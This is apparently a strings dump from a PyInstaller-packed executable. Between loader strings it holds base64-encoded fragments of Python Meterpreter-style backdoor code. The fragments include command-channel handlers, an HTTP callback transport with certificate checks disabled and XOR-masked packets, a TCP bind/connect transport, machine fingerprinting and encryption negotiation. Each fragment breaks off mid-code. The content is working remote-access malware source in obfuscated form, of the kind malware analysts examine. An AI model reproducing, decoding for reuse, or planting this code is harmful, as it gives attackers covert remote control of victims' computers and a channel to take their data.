CAgcmV0dXJuIEVSUk9SX0ZBSUxVUkUsIHJlc3BvbnNlCgogICAgZGVmIF9jb3JlX3RyYW5zcG9ydF9zZXRfdGltZW91dHMoc2VsZiwgcmVxdWVzdCwgcmVzcG9uc2UpOgogICAgICAgIHRpbWVvdXRfdmFsdWUgPSBwYWNrZXRfZ2V0X3RsdihyZXF1ZXN0LCBUTFZfVFlQRV9UUkFOU19TRVNTSU9OX0VYUCkuZ2V0KCd2YWx1ZScpCiAgICAgICAgaWYgbm90IHRpbWVvdXRfdmFsdWUgaXMgTm9uZToKICAgICAgICAgICAgc2VsZi5zZXNzaW9uX2V4cGlyeV90aW1lID0gdGltZW91dF92YWx1ZQogICAgICAgICAgICBzZWxmLnNlc3Npb25fZXhwaXJ5X2VuZCA9IHRpbWUudGltZSgpICsgc2VsZi5zZXNzaW9uX2V4cGlyeV90aW1lCiAgICAgICAgdGltZW91dF92YWx1ZSA9IHBhY2tldF9nZXRfdGx2KHJlcXVlc3QsIFRMVl9UWVBFX1RSQU5TX0NPTU1fVElNRU9VVCkuZ2V0KCd2YWx1ZScpCiAgICAgICAgaWYgdGltZW91dF92YWx1ZToKICAgICAgICAgICAgc2VsZi50cmFuc3BvcnQuY29tbXVuaWNhdGlvbl90aW1lb3V0ID0gdGltZW91dF92YWx1ZQogICAgICAgIHJldHJ5X3ZhbHVlID0gcGFja2V0X2dldF90bHYocmVxdWVzdCwgVExWX1RZUEVfVFJBTlNfUkVUUllfVE9UQUwpLmdldCgndmFsdWUnKQogICAgICAgIGlmIHJldHJ5X3ZhbHVlOgogICAgICAgICAgICBzZWxmLnRyYW5zcG9ydC5yZXRyeV90b3RhbCA9IHJldHJ5X3ZhbHVlCiAgICAgICAgcmV0cnlfdmFsdWUgPSBwYWNrZXRfZ2V0X3RsdihyZXF1ZXN0LCBUTFZfVFlQRV9UUkFOU19SRVRSWV9XQUlUKS5nZXQoJ3ZhbHVlJykKICAgICAgICBpZiByZXRyeV92YWx1ZToKICAgICAgICAgICAgc2VsZi50cmFuc3BvcnQucmV0cnlfd2FpdCA9IHJldHJ5X3ZhbHVlCgogICAgICAgIGlmIHNlbGYuc2Vzc2lvbl9leHBpcnlfdGltZSA+IDA6CiAgICAgICAgICAgIHJlc3BvbnNlICs9IHRsdl9wYWNrKFRMVl9UWVBFX1RSQU5TX1NFU1NJT05fRVhQLCBzZWxmLnNlc3Npb25fZXhwaXJ5X2VuZCAtIHRpbWUudGltZSgpKQogICAgICAgIHJlc3BvbnNlICs9IHNlbGYudHJhbnNwb3J0LnRsdl9wYWNrX3RpbWVvdXRzKCkKICAgICAgICByZXR1cm4gRVJST1JfU1VDQ0VTUywgcmVzcG9uc2UKCiAgICBkZWYgX2NvcmVfdHJhbnNwb3J0X3NsZWVwKHNlbGYsIHJlcXVlc3QsIHJlc3BvbnNlKToKICAgICAgICBzZWNvbmRzID0gcGFja2V0X2dldF90bHYocmVxdWVzdCwgVExWX1RZUEVfVFJBTlNfQ09NTV9USU1FT1VUKVsndmFsdWUnXQogICAgICAgIHNlbGYuc2VuZF9wYWNrZXQocmVzcG9uc2UgKyB0bHZfcGFjayhUTFZfVFlQRV9SRVNVTFQsIEVSUk9SX1NVQ0NFU1MpKQogICAgICAgIGlmIHNlY29uZHM6CiAgICAgICAgICAgIHNlbGYuX3RyYW5zcG9ydF9zbGVlcCA9IHNlY29uZHMKICAgICAgICByZXR1cm4gRVJST1JfU1VDQ0VTUywgcmVzcG9uc2UKCiAgICBkZWYgX2NvcmVfY2hhbm5lbF9vcGVuKHNlbGYsIHJlcXVlc3QsIHJlc3BvbnNlKToKICAgICAgICBjaGFubmVsX3R5cGUgPSBwYWNrZXRfZ2V0X3RsdihyZXF1ZXN0LCBUTFZfVFlQRV9DSEFOTkVMX1RZUEUpCiAgICAgICAgaGFuZGxlciA9ICdjaGFubmVsX29wZW5fJyArIGNoYW5uZWxfdHlwZVsndmFsdWUnXQogICAgICAgIGlmIGhhbmRsZXIgbm90IGluIHNlbGYuZXh0ZW5zaW9uX2Z1bmN0aW9uczoKICAgICAgICAgICAgZGVidWdfcHJpbnQoJ1stXSBjb3JlX2NoYW5uZWxfb3BlbiBtaXNzaW5nIGhhbmRsZXI6ICcgKyBoYW5kbGVyKQogICAgICAgICAgICByZXR1cm4gZXJyb3JfcmVzdWx0KE5vdEltcGxlbWVudGVkRXJyb3IpLCByZXNwb25zZQogICAgICAgIGRlYnVnX3ByaW50KCdbKl0gY29yZV9jaGFubmVsX29wZW4gZGlzcGF0Y2hpbmcgdG8gaGFuZGxlcjogJyArIGhhbmRsZXIpCiAgICAgICAgaGFuZGxlciA9IHNlbGYuZXh0ZW5zaW9uX2Z1bmN0aW9uc1toYW5kbGVyXQogICAgICAgIHJldHVybiBoYW5kbGVyKHJlcXVlc3QsIHJlc3BvbnNlKQoKICAgIGRlZiBfY29yZV9jaGFubmVsX2Nsb3NlKHNlbGYsIHJlcXVlc3QsIHJlc3BvbnNlKToKICAgICAgICBjaGFubmVsX2lkID0gcGFja2V0X2dldF90bHYocmVxdWVzdCwgVExWX1RZUEVfQ0hBTk5FTF9JRClbJ3ZhbHVlJ10KICAgICAgICBpZiBjaGFubmVsX2lkIG5vdCBpbiBzZWxmLmNoYW5uZWxzOgogICAgICAgICAgICByZXR1cm4gRVJST1JfRkFJTFVSRSwgcmVzcG9uc2UKICAgICAgICBjaGFubmVsID0gc2VsZi5jaGFubmVsc1tjaGFubmVsX2lkXQogICAgICAgIHN0YXR1cywgcmVzcG9uc2UgPSBjaGFubmVsLmNvcmVfY2xvc2UocmVxdWVzdCwgcmVzcG9uc2UpCiAgICAgICAgaWYgc3RhdHVzID09IEVSUk9SX1NVQ0NFU1M6CiAgICAgICAgICAgIGRlbCBzZWxmLmNoYW5uZWxzW2NoYW5uZWxfaWRdCiAgICAgICAgICAgIGlmIGNoYW5uZWxfaWQgaW4gc2VsZi5pbnRlcmFjdF9jaGFubmVsczoKICAgICAgICAgICAgICAgIHNlbGYuaW50ZXJhY3RfY2hhbm5lbHMucmVtb3ZlKGNoYW5uZWxfaWQpCiAgICAgICAgICAgIGRlYnVnX3ByaW50KCdbKl0gY2xvc2VkIGFuZCByZW1vdmVkIGNoYW5uZWwgaWQ6ICcgKyBzdHIoY2hhbm5lbF9pZCkpCiAgICAgICAgcmV0dXJuIHN0YXR1cywgcmVzcG9uc2UKCiAgICBkZWYgX2NvcmVfY2hhbm5lbF9lb2Yoc2VsZiwgcmVxdWVzdCwgcmVzcG9uc2UpOgogICAgICAgIGNoYW5uZWxfaWQgPSBwYWNrZXRfZ2V0X3RsdihyZXF1ZXN0LCBUTFZfVFlQRV9DSEFOTkVMX0lEKVsndmFsdWUnXQogICAgICAgIGlmIGNoYW5uZWxfaWQgbm90IGluIHNlbGYuY2hhbm5lbHM6CiAgICAgICAgICAgIHJldHVybiBFUlJPUl9GQUlMVVJFLCByZXNwb25zZQogICAgICAgIGNoYW5uZWwgPSBzZWxmLmNoYW5uZWxzW2NoYW5uZWxfaWRdCiAgICAgICAgc3RhdHVzLCByZXNwb25zZSA9IGNoYW5uZWwuY29yZV9lb2YocmVxdWVzdCwgcmVzcG9uc2UpCiAgICAgICAgcmV0dXJuIEVSUk9SX1NVQ0NFU1MsIHJlc3BvbnNlCgoKICAgIGRlZiBfY29yZV9jaGFubmVsX2ludGVyYWN0KHNlbGYsIHJlcXVlc3QsIHJlc3BvbnNlKToKICAgICAgICBjaGFubmVsX2lkID0gcGFja2V0X2dldF90bHYocmVxdWVzdCwgVExWX1RZUEVfQ0hBTk5FTF9JRClbJ3ZhbHVlJ10KICAgICAgICBpZiBjaGFubmVsX2lkIG5vdCBpbiBzZWxmLmNoYW5uZWxzOgogICAgICAgICAgICByZXR1cm4gRVJST1JfRkFJTFVSRSwgcmVzcG9uc2UKICAgICAgICBjaGFubmVsID0gc2VsZi5jaGFubmVsc1tjaGFubmVsX2lkXQogICAgICAgIHRvZ2dsZSA9IHBhY2tldF9nZXRfdGx2KHJlcXVlc3QsIFRMVl9UWVBFX0JPT0wpWyd2YWx1ZSddCiAgICAgICAgaWYgdG9nZ2xlOgogICAgICAgICAgICBpZiBjaGFubmVsX2lkIGluIHNlbGYuaW50ZXJhY3RfY2hhbm5lbHM6CiAgICAgICAgICAgICAgICBzZWxmLmludGVyYWN0X2NoYW5uZWxzLnJlbW92ZShjaGFubmVsX2lkKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgc2VsZi5pbnRlcmFjdF9jaGFubmVscy5hcHBlbmQoY2hhbm5lbF9pZCkKICAgICAgICBlbGlmIGNoYW5uZWxfaWQgaW4gc2VsZi5pbnRlcmFjdF9jaGFubmVsczoKICAgICAgICAgICAgc2VsZi5pbnRlcmFjdF9jaGFubmVscy5yZW1vdmUoY2hhbm5lbF9pZCkKICAgICAgICByZXR1cm4gRVJST1JfU1VDQ0VTUywgcmVzcG9uc2UKCiAgICBkZWYgX2NvcmVfY2hhbm5lbF9yZWFkKHNlbGYsIHJlcXVlc3QsIHJlc3BvbnNlKToKICAgICAgICBjaGFubmVsX2lkID0gcGFja2V0X2dldF90bHYocmVxdWVzdCwgVExWX1RZUEVfQ0hBTk5FTF9JRClbJ3ZhbHVlJ10KICAgICAgICBpZiBjaGFubmVsX2lkIG5vdCBpbiBzZWxmLmNoYW5uZWxzOgogICAgICAgICAgICByZXR1cm4gRVJST1JfRkFJTFVSRSwgcmVzcG9uc2UKICAgICAgICBjaGFubmVsID0gc2VsZi5jaGFubmVsc1tjaGFubmVsX2lkXQogICAgICAgIHN0YXR1cywgcmVzcG9uc2UgPSBjaGFubmVsLmNvcmVfcmVhZChyZXF1ZXN0LCByZXNwb25zZSkKICAgICAgICBpZiBub3QgY2hhbm5lbC5pc19hbGl2ZSgpOgogICAgICAgICAgICBzZWxmLmhhbmRsZV9kZWFkX3Jlc291cmNlX2NoYW5uZWwoY2hhbm5lbF9pZCkKICAgICAgICByZXR1cm4gc3RhdHVzLCByZXNwb25zZQoKICAgIGRlZiBfY29yZV9jaGFubmVsX3dyaXRlKHNlbGYsIHJlcXVlc3QsIHJlc3BvbnNlKToKICAgICAgICBjaGFubmVsX2lkID0gcGFja2V0X2dldF90bHYocmVxdWVzdCwgVExWX1RZUEVfQ0hBTk5FTF9JRClbJ3ZhbHVlJ10KICAgICAgICBpZiBjaGFubmVsX2lkIG5vdCBpbiBzZWxmLmNoYW5uZWxzOgogICAgICAgICAgICByZXR1cm4gRVJST1JfRkFJTFVSRSwgcmVzcG9uc2UKICAgICAgICBjaGFubmVsID0gc2VsZi5jaGFubmVsc1tjaGFubmVsX2lkXQogICAgICAgIHN0YXR1cyA9IEVSUk9SX0ZBSUxVUkUKICAgICAgICBpZiBjaGFubmVsLmlzX2FsaXZlKCk6CiAgICAgICAgICAgIHN0YXR1cywgcmVzcG9uc2UgPSBjaGFubmVsLmNvcmVfd3JpdGUocmVxdWVzdCwgcmVzcG9uc2UpCiAgICAgICAgIyBldmFsdWF0ZSBjaGFubmVsLmlzX2FsaXZlKCkgdHdpY2UgYmVjYXVzZSBpdCBjb3VsZCBoYXZlIGNoYW5nZWQKICAgICAgICBpZiBub3QgY2hhbm5lbC5pc19hb",
        "unpack",
        "from multiprocessing.resource_tracker import main",
        "\n        PEP-302 finder.find_module() method for the ``sys.meta_path`` hook.\n\n        fullname     fully qualified name of the module\n        path         None for a top-level module, or package.__path__\n                     for submodules or subpackages.\n\n        Return a loader object if the module was found, or None if it wasn't.\n        If find_module() raises an exception, it will be propagated to the\n        caller, aborting the import.\n        ",
        "__init__.pyc",
        "import %s # PyInstaller PYZ",
        "/",
        "cmVyPU5vbmUsIGh0dHBfY29va2llPU5vbmUpOgogICAgICAgIHN1cGVyKEh0dHBUcmFuc3BvcnQsIHNlbGYpLl9faW5pdF9fKCkKICAgICAgICBvcGVuZXJfYXJncyA9IFtdCiAgICAgICAgc2NoZW1lID0gdXJsLnNwbGl0KCc6JywgMSlbMF0KICAgICAgICBpZiBzY2hlbWUgPT0gJ2h0dHBzJyBhbmQgKChzeXMudmVyc2lvbl9pbmZvWzBdID09IDIgYW5kIHN5cy52ZXJzaW9uX2luZm8gPj0gKDIsIDcsIDkpKSBvciBzeXMudmVyc2lvbl9pbmZvID49ICgzLCA0LCAzKSk6CiAgICAgICAgICAgIGltcG9ydCBzc2wKICAgICAgICAgICAgc3NsX2N0eCA9IHNzbC5TU0xDb250ZXh0KHNzbC5QUk9UT0NPTF9TU0x2MjMpCiAgICAgICAgICAgIHNzbF9jdHguY2hlY2tfaG9zdG5hbWUgPSBGYWxzZQogICAgICAgICAgICBzc2xfY3R4LnZlcmlmeV9tb2RlID0gc3NsLkNFUlRfTk9ORQogICAgICAgICAgICBvcGVuZXJfYXJncy5hcHBlbmQodXJsbGliLkhUVFBTSGFuZGxlcigwLCBzc2xfY3R4KSkKICAgICAgICBpZiBwcm94eToKICAgICAgICAgICAgb3BlbmVyX2FyZ3MuYXBwZW5kKHVybGxpYi5Qcm94eUhhbmRsZXIoe3NjaGVtZTogcHJveHl9KSkKICAgICAgICAgICAgb3BlbmVyX2FyZ3MuYXBwZW5kKHVybGxpYi5Qcm94eUJhc2ljQXV0aEhhbmRsZXIoKSkKICAgICAgICBzZWxmLnByb3h5ID0gcHJveHkKICAgICAgICBvcGVuZXIgPSB1cmxsaWIuYnVpbGRfb3BlbmVyKCpvcGVuZXJfYXJncykKICAgICAgICBvcGVuZXIuYWRkaGVhZGVycyA9IFtdCiAgICAgICAgaWYgdXNlcl9hZ2VudDoKICAgICAgICAgICAgb3BlbmVyLmFkZGhlYWRlcnMuYXBwZW5kKCgnVXNlci1BZ2VudCcsIHVzZXJfYWdlbnQpKQogICAgICAgIGlmIGh0dHBfY29va2llOgogICAgICAgICAgICBvcGVuZXIuYWRkaGVhZGVycy5hcHBlbmQoKCdDb29raWUnLCBodHRwX2Nvb2tpZSkpCiAgICAgICAgaWYgaHR0cF9yZWZlcmVyOgogICAgICAgICAgICBvcGVuZXIuYWRkaGVhZGVycy5hcHBlbmQoKCdSZWZlcmVyJywgaHR0cF9yZWZlcmVyKSkKICAgICAgICBzZWxmLnVzZXJfYWdlbnQgPSB1c2VyX2FnZW50CiAgICAgICAgdXJsbGliLmluc3RhbGxfb3BlbmVyKG9wZW5lcikKICAgICAgICBzZWxmLnVybCA9IHVybAogICAgICAgIHNlbGYuX2h0dHBfcmVxdWVzdF9oZWFkZXJzID0geydDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJ30KICAgICAgICBpZiBodHRwX2hvc3Q6CiAgICAgICAgICAgIHNlbGYuX2h0dHBfcmVxdWVzdF9oZWFkZXJzWydIb3N0J10gPSBodHRwX2hvc3QKICAgICAgICBzZWxmLl9maXJzdF9wYWNrZXQgPSBOb25lCiAgICAgICAgc2VsZi5fZW1wdHlfY250ID0gMAoKICAgIGRlZiBfYWN0aXZhdGUoc2VsZik6CiAgICAgICAgcmV0dXJuIFRydWUKICAgICAgICBzZWxmLl9maXJzdF9wYWNrZXQgPSBOb25lCiAgICAgICAgcGFja2V0ID0gc2VsZi5fZ2V0X3BhY2tldCgpCiAgICAgICAgaWYgcGFja2V0IGlzIE5vbmU6CiAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgICAgIHNlbGYuX2ZpcnN0X3BhY2tldCA9IHBhY2tldAogICAgICAgIHJldHVybiBUcnVlCgogICAgZGVmIF9nZXRfcGFja2V0KHNlbGYpOgogICAgICAgIGlmIHNlbGYuX2ZpcnN0X3BhY2tldDoKICAgICAgICAgICAgcGFja2V0ID0gc2VsZi5fZmlyc3RfcGFja2V0CiAgICAgICAgICAgIHNlbGYuX2ZpcnN0X3BhY2tldCA9IE5vbmUKICAgICAgICAgICAgcmV0dXJuIHBhY2tldAogICAgICAgIHBhY2tldCA9IE5vbmUKICAgICAgICB4b3Jfa2V5ID0gTm9uZQogICAgICAgIHJlcXVlc3QgPSB1cmxsaWIuUmVxdWVzdChzZWxmLnVybCwgTm9uZSwgc2VsZi5faHR0cF9yZXF1ZXN0X2hlYWRlcnMpCiAgICAgICAgdXJsb3Blbl9rd2FyZ3MgPSB7fQogICAgICAgIGlmIHN5cy52ZXJzaW9uX2luZm8gPiAoMiwgNik6CiAgICAgICAgICAgIHVybG9wZW5fa3dhcmdzWyd0aW1lb3V0J10gPSBzZWxmLmNvbW11bmljYXRpb25fdGltZW91dAogICAgICAgIHRyeToKICAgICAgICAgICAgdXJsX2ggPSB1cmxsaWIudXJsb3BlbihyZXF1ZXN0LCAqKnVybG9wZW5fa3dhcmdzKQogICAgICAgICAgICBwYWNrZXQgPSB1cmxfaC5yZWFkKCkKICAgICAgICAgICAgZm9yIF8gaW4gcmFuZ2UoMSk6CiAgICAgICAgICAgICAgICBpZiBwYWNrZXQgPT0gJyc6CiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgIGlmIGxlbihwYWNrZXQpIDwgUEFDS0VUX0hFQURFUl9TSVpFOgogICAgICAgICAgICAgICAgICAgIHBhY2tldCA9IE5vbmUgICMgbG9va3MgY29ycnVwdAogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICB4b3Jfa2V5ID0gc3RydWN0LnVucGFjaygnQkJCQicsIHBhY2tldFs6UEFDS0VUX1hPUl9LRVlfU0laRV0pCiAgICAgICAgICAgICAgICBoZWFkZXIgPSB4b3JfYnl0ZXMoeG9yX2tleSwgcGFja2V0WzpQQUNLRVRfSEVBREVSX1NJWkVdKQogICAgICAgICAgICAgICAgcGt0X2xlbmd0aCA9IHN0cnVjdC51bnBhY2soJz5JJywgaGVhZGVyW1BBQ0tFVF9MRU5HVEhfT0ZGOlBBQ0tFVF9MRU5HVEhfT0ZGK1BBQ0tFVF9MRU5HVEhfU0laRV0pWzBdIC0gOAogICAgICAgICAgICAgICAgaWYgbGVuKHBhY2tldCkgIT0gKHBrdF9sZW5ndGggKyBQQUNLRVRfSEVBREVSX1NJWkUpOgogICAgICAgICAgICAgICAgICAgIHBhY2tldCA9IE5vbmUgICMgbG9va3MgY29ycnVwdAogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgZGVidWdfdHJhY2ViYWNrKCdGYWlsdXJlIHRvIHJlY2VpdmUgcGFja2V0IGZyb20gJyArIHNlbGYudXJsKQoKICAgICAgICBpZiBub3QgcGFja2V0OgogICAgICAgICAgICBkZWxheSA9IDEwICogc2VsZi5fZW1wdHlfY250CiAgICAgICAgICAgIGlmIHNlbGYuX2VtcHR5X2NudCA+PSAwOgogICAgICAgICAgICAgICAgZGVsYXkgKj0gMTAKICAgICAgICAgICAgc2VsZi5fZW1wdHlfY250ICs9IDEKICAgICAgICAgICAgdGltZS5zbGVlcChmbG9hdChtaW4oMTAwMDAsIGRlbGF5KSkgLyAxMDAwKQogICAgICAgICAgICByZXR1cm4gcGFja2V0CgogICAgICAgIHNlbGYuX2VtcHR5X2NudCA9IDAKICAgICAgICByZXR1cm4gcGFja2V0CgogICAgZGVmIF9zZW5kX3BhY2tldChzZWxmLCBwYWNrZXQpOgogICAgICAgIHJlcXVlc3QgPSB1cmxsaWIuUmVxdWVzdChzZWxmLnVybCwgcGFja2V0LCBzZWxmLl9odHRwX3JlcXVlc3RfaGVhZGVycykKICAgICAgICB1cmxvcGVuX2t3YXJncyA9IHt9CiAgICAgICAgaWYgc3lzLnZlcnNpb25faW5mbyA+ICgyLCA2KToKICAgICAgICAgICAgdXJsb3Blbl9rd2FyZ3NbJ3RpbWVvdXQnXSA9IHNlbGYuY29tbXVuaWNhdGlvbl90aW1lb3V0CiAgICAgICAgdXJsX2ggPSB1cmxsaWIudXJsb3BlbihyZXF1ZXN0LCAqKnVybG9wZW5fa3dhcmdzKQogICAgICAgIHJlc3BvbnNlID0gdXJsX2gucmVhZCgpCgogICAgZGVmIHBhdGNoX3VyaV9wYXRoKHNlbGYsIG5ld19wYXRoKToKICAgICAgICBtYXRjaCA9IHJlLm1hdGNoKHInaHR0cHM/Oi8vW14vXSsoLy4qJCknLCBzZWxmLnVybCkKICAgICAgICBpZiBtYXRjaCBpcyBOb25lOgogICAgICAgICAgICByZXR1cm4gRmFsc2UKICAgICAgICBzZWxmLnVybCA9IHNlbGYudXJsWzptYXRjaC5zcGFuKDEpWzBdXSArIG5ld19wYXRoCiAgICAgICAgcmV0dXJuIFRydWUKCiAgICBkZWYgdGx2X3BhY2tfdHJhbnNwb3J0X2dyb3VwKHNlbGYpOgogICAgICAgIHRyYW5zX2dyb3VwICA9IHN1cGVyKEh0dHBUcmFuc3BvcnQsIHNlbGYpLnRsdl9wYWNrX3RyYW5zcG9ydF9ncm91cCgpCiAgICAgICAgaWYgc2VsZi51c2VyX2FnZW50OgogICAgICAgICAgICB0cmFuc19ncm91cCArPSB0bHZfcGFjayhUTFZfVFlQRV9UUkFOU19VQSwgc2VsZi51c2VyX2FnZW50KQogICAgICAgIGlmIHNlbGYucHJveHk6CiAgICAgICAgICAgIHRyYW5zX2dyb3VwICs9IHRsdl9wYWNrKFRMVl9UWVBFX1RSQU5TX1BST1hZX0hPU1QsIHNlbGYucHJveHkpCiAgICAgICAgcmV0dXJuIHRyYW5zX2dyb3VwCgpjbGFzcyBUY3BUcmFuc3BvcnQoVHJhbnNwb3J0KToKICAgIGRlZiBfX2luaXRfXyhzZWxmLCB1cmwsIHNvY2tldD1Ob25lKToKICAgICAgICBzdXBlcihUY3BUcmFuc3BvcnQsIHNlbGYpLl9faW5pdF9fKCkKICAgICAgICBzZWxmLnVybCA9IHVybAogICAgICAgIHNlbGYuc29ja2V0ID0gc29ja2V0CiAgICAgICAgc2VsZi5fY2xlYW51cF90aHJlYWQgPSBOb25lCiAgICAgICAgc2VsZi5fZmlyc3RfcGFja2V0ID0gVHJ1ZQoKICAgIGRlZiBfc29ja19jbGVhbnVwKHNlbGYsIHNvY2spOgogICAgICAgIHJlbWFpbmluZ190aW1lID0gc2VsZi5jb21tdW5pY2F0aW9uX3RpbWVvdXQKICAgICAgICB3aGlsZSByZW1haW5pbmdfdGltZSA+IDA6CiAgICAgICAgICAgIGl0ZXJfc3RhcnRfdGltZSA9IHRpbWUudGltZSgpCiAgICAgICAgICAgIGlmIHNlbGVjdC5zZWxlY3QoW3NvY2tdLCBbXSwgW10sIHJlbWFpbmluZ190aW1lKVswXToKICAgICAgICAgICAgICAgIGlmIGxlbihzb2NrLnJlY3YoNDA5NikpID09IDA6CiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgcmVtYWluaW5nX3RpbWUgLT0gdGltZS50aW1lKCkgLSBpdGVyX3N0YXJ0X3RpbWUKICAgICAgICBzb2NrLmNsb3NlKCkKCiAgICBkZWYgX2FjdGl2YXRlKHNlbGYpOgogICAgICAgIGFkZHJlc3MsIHBvcnQgPSBzZWxmLnVybFs2Ol0ucnNwbGl0KCc6JywgMSkKICAgICAgICBwb3J0ID0gaW50KHBvcnQucnN0cmlwKCcvJykpCiAgICAgICAgdGltZW91dCA9IG1heChzZWxmLmNvbW11bmljYXRpb25fdGltZW91dCwgMzApCiAgICAgICAgaWYgYWRkcmVzcyBpbiAoJycsICcwLjAuMC4wJywgJzo6Jyk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHNlcnZlcl9zb2NrID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVDYsIHNvY2tldC5TT0NLX1NUUkVBTSkKICAgICAgICAgICAgICAgIHNlcnZlcl9zb2NrLnNldHNvY2tvcHQoc29ja2V0LklQUFJPVE9fSVBWNiwgc29ja2V0LklQVjZfVjZPTkxZLCAwKQogICAgICAgICAgICBleGNlcHQgKEF0dHJpYnV0ZUVycm9yLCBzb2NrZXQuZXJyb3IpOgogICAgICAgICAgICAgICAgc2VydmVyX3NvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgICAgIHNlcnZlcl9zb2NrLmJpbmQoKCcnLCBwb3J0KSkKICAgICAgICAgICAgc2VydmVyX3NvY2subGlzdGVuKDEpCiAgICAgICAgICAgIGlmIG5vdCBzZWxlY3Quc2VsZWN0KFtzZXJ2ZXJfc29ja10sIFtdLCBbXSwgdGltZW91dClbMF06CiAgICAgICAgICAgICAgICBzZXJ2ZXJfc29jay5jbG9zZSgpCiAgICAgICAgICAgICAgICByZXR1cm4gRmFsc2UKICAgICAgICAgICAgc29jaywg",
        "win",
        "posix",
        "AgIHJlc3BvbnNlICs9IHRsdl9wYWNrKFRMVl9UWVBFX1NFU1NJT05fR1VJRCwgYmluYXNjaWkuYTJiX2hleChieXRlcyhTRVNTSU9OX0dVSUQsICdVVEYtOCcpKSkKICAgICAgICByZXR1cm4gRVJST1JfU1VDQ0VTUywgcmVzcG9uc2UKCiAgICBkZWYgX2NvcmVfc2V0X3Nlc3Npb25fZ3VpZChzZWxmLCByZXF1ZXN0LCByZXNwb25zZSk6CiAgICAgICAgbmV3X2d1aWQgPSBwYWNrZXRfZ2V0X3RsdihyZXF1ZXN0LCBUTFZfVFlQRV9TRVNTSU9OX0dVSUQpCiAgICAgICAgaWYgbmV3X2d1aWQ6CiAgICAgICAgICAgIFNFU1NJT05fR1VJRCA9IGJpbmFzY2lpLmIyYV9oZXgobmV3X2d1aWRbJ3ZhbHVlJ10pCiAgICAgICAgcmV0dXJuIEVSUk9SX1NVQ0NFU1MsIHJlc3BvbnNlCgogICAgZGVmIF9jb3JlX21hY2hpbmVfaWQoc2VsZiwgcmVxdWVzdCwgcmVzcG9uc2UpOgogICAgICAgIHNlcmlhbCA9ICcnCiAgICAgICAgbWFjaGluZV9uYW1lID0gcGxhdGZvcm0udW5hbWUoKVsxXQogICAgICAgIGlmIGhhc193aW5kbGw6CiAgICAgICAgICAgIGZyb20gY3R5cGVzIGltcG9ydCB3aW50eXBlcwoKICAgICAgICAgICAgazMyID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMgogICAgICAgICAgICBzeXNfZGlyID0gY3R5cGVzLmNyZWF0ZV91bmljb2RlX2J1ZmZlcigyNjApCiAgICAgICAgICAgIGlmIG5vdCBrMzIuR2V0U3lzdGVtRGlyZWN0b3J5VyhjdHlwZXMuYnlyZWYoc3lzX2RpciksIDI2MCk6CiAgICAgICAgICAgICAgICByZXR1cm4gRVJST1JfRkFJTFVSRV9XSU5ET1dTCgogICAgICAgICAgICB2b2xfYnVmID0gY3R5cGVzLmNyZWF0ZV91bmljb2RlX2J1ZmZlcigyNjApCiAgICAgICAgICAgIGZzX2J1ZiA9IGN0eXBlcy5jcmVhdGVfdW5pY29kZV9idWZmZXIoMjYwKQogICAgICAgICAgICBzZXJpYWxfbnVtID0gd2ludHlwZXMuRFdPUkQoMCkKCiAgICAgICAgICAgIGlmIG5vdCBrMzIuR2V0Vm9sdW1lSW5mb3JtYXRpb25XKGN0eXBlcy5jX3djaGFyX3Aoc3lzX2Rpci52YWx1ZVs6M10pLAogICAgICAgICAgICAgICAgICAgIHZvbF9idWYsIGN0eXBlcy5zaXplb2Yodm9sX2J1ZiksIGN0eXBlcy5ieXJlZihzZXJpYWxfbnVtKSwgTm9uZSwKICAgICAgICAgICAgICAgICAgICBOb25lLCBmc19idWYsIGN0eXBlcy5zaXplb2YoZnNfYnVmKSk6CiAgICAgICAgICAgICAgICByZXR1cm4gRVJST1JfRkFJTFVSRV9XSU5ET1dTCiAgICAgICAgICAgIHNlcmlhbF9udW0gPSBzZXJpYWxfbnVtLnZhbHVlCiAgICAgICAgICAgIHNlcmlhbCA9ICIlMDR4IiAlICgoc2VyaWFsX251bSA+PiAxNikgJiAweGZmZmYpICsgJy0nICIlMDR4IiAlIChzZXJpYWxfbnVtICYgMHhmZmZmKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHNlcmlhbCA9IGdldF9oZGRfbGFiZWwoKQoKICAgICAgICByZXNwb25zZSArPSB0bHZfcGFjayhUTFZfVFlQRV9NQUNISU5FX0lELCAiJXM6JXMiICUgKHNlcmlhbCwgbWFjaGluZV9uYW1lKSkKICAgICAgICByZXR1cm4gRVJST1JfU1VDQ0VTUywgcmVzcG9uc2UKCiAgICBkZWYgX2NvcmVfbmF0aXZlX2FyY2goc2VsZiwgcmVxdWVzdCwgcmVzcG9uc2UpOgogICAgICAgIHJlc3BvbnNlICs9IHRsdl9wYWNrKFRMVl9UWVBFX1NUUklORywgZ2V0X25hdGl2ZV9hcmNoKCkpCiAgICAgICAgcmV0dXJuIEVSUk9SX1NVQ0NFU1MsIHJlc3BvbnNlCgogICAgZGVmIF9jb3JlX3BhdGNoX3VybChzZWxmLCByZXF1ZXN0LCByZXNwb25zZSk6CiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uoc2VsZi50cmFuc3BvcnQsIEh0dHBUcmFuc3BvcnQpOgogICAgICAgICAgICByZXR1cm4gRVJST1JfRkFJTFVSRSwgcmVzcG9uc2UKICAgICAgICBuZXdfdXJpX3BhdGggPSBwYWNrZXRfZ2V0X3RsdihyZXF1ZXN0LCBUTFZfVFlQRV9UUkFOU19VUkwpWyd2YWx1ZSddCiAgICAgICAgaWYgbm90IHNlbGYudHJhbnNwb3J0LnBhdGNoX3VyaV9wYXRoKG5ld191cmlfcGF0aCk6CiAgICAgICAgICAgIHJldHVybiBFUlJPUl9GQUlMVVJFLCByZXNwb25zZQogICAgICAgIHJldHVybiBFUlJPUl9TVUNDRVNTLCByZXNwb25zZQoKICAgIGRlZiBfY29yZV9uZWdvdGlhdGVfdGx2X2VuY3J5cHRpb24oc2VsZiwgcmVxdWVzdCwgcmVzcG9uc2UpOgogICAg